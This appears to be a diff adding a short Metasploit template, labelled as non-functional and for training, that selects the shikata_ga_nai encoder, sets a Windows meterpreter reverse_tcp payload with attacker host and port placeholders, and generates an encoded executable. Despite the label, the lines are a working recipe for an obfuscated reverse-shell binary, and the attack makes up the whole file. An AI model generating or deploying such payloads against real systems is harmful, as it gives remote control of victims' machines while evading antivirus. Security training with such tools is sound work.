@@ -1,0 +1,9 @@
+# Encoder Template
+# For Training Use – Non-functional Template
+
+use encoder/x86/shikata_ga_nai
+set payload windows/meterpreter/reverse_tcp
+set LHOST <LHOST>
+set LPORT <LPORT>
+set iterations 5
+generate -f exe -o /tmp/encoded.exe
